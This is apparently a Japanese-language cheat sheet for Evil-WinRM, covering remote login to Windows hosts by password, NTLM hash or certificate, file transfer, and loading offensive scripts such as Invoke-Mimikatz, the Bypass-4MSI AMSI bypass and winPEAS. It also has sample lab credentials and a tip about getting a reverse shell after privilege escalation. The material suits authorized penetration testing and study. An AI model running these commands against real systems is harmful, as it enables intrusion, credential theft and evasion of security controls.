# 注意点
Evil-WinRMのコンソール上で権限昇格ツール（PrintSpoofer等）を使用した場合、コンソール内ではユーザは変更されないため権限昇格後のユーザのセッションを用いたリバースシェルを接続するなどの工夫が必要

---
# ログイン
1. **パスワードを使用してログイン**
```bash
evil-winrm -i <IP> -u <user> -p <pass>
```
```bash
evil-winrm -i 192.168.121.96 -u Eric.Wallows -p EricLikesRunning800
```
-S: ポート5986が開いている場合に使用

2. **ハッシュを使用してログイン**
```bash
evil-winrm -i <IP> -u <user> -H <ntlmhash>
```

3. **キーを使用してログイン**
```bash
evil-winrm -i <IP> -c <certificate.pem> -k <priv-key.pem> -S
```
-c: 公開鍵
-k: 秘密鍵
---
# ログ
ログインしたセッションのログを表示するには、以下のコマンドを使用します：

```bash
evil-winrm -i <IP> -u <user> -p <pass> -l
```
### ファイルのアップロードとダウンロード

1. **ファイルのアップロード**
```bash
upload <file>
```

2. **ファイルのダウンロード**
```bash
download <file> <filepath-kali>
```
パスを毎回指定する必要はありません。

---
# Kaliロケーションからのファイルの読み込み
Kaliの特定のロケーションからファイルを直接ロードするには、以下のコマンドを使用します：
```bash
evil-winrm -i <IP> -u <user> -p <pass> -s /opt/privsc/powershell
```
ファイルの場所: 場所は異なる場合があります。
例: Bypass-4MSI, Invoke-Mimikatz.ps1, Invoke-Mimikatz

### Evil-WinRM コマンド
1. **コマンドメニューの表示**
```bash
menu
```
コマンドを表示し、実行するコマンドを選択します。

2. **バイナリの実行**
```bash
evil-winrm -i <IP> -u <user> -p <pass> -e /opt/privsc
```
例: Bypass-4MSI, Invoke-Binary /opt/privsc/winPEASx64.exe